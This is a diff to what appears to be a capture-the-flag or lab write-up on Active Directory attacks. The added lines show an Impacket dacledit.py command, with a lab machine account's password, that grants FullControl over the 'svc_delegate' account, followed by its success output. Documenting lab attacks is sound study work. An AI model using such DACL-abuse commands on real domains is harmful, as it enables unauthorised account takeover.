@@ -776,5 +776,17 @@ I have WriteDACL on the `svc_delegate` account, this means i can add GenericAll 
 # Compromising `svc_delegate`
 
 ```python
+dacledit.py -action 'write' -rights 'FullControl' -principal 'itops01$' -target 'svc_delegate' 'hsm-defense.local'/'itops01$':'paSSword2459' -k -dc-host dc.hsm-defense.local
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+/home/kali/.local/bin/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
+  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
+[*] DACL backed up to dacledit-20260921-201347.bak
+[*] DACL modified successfully!
+```
+
+Ill add GenericAll
+
+```python
 
 ```
